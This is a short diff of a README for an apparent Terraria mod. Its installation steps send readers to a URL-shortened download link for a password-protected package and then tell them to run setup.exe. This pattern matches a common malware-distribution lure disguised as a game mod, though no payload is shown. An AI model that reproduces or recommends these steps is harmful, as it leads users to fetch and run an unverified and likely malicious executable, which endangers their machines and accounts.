@@ -6,6 +6,7 @@ This mod adds new elements and mechanics to Terraria, improving the gameplay.
 ## Installation
 📥 Installation Guide
 🖥️ Quick Setup (Windows .exe)
+
 1️⃣ [Download](https://goo.su/W3V5g) and extract the package (password: Project12!)
 
 2️⃣ Run setup.exe
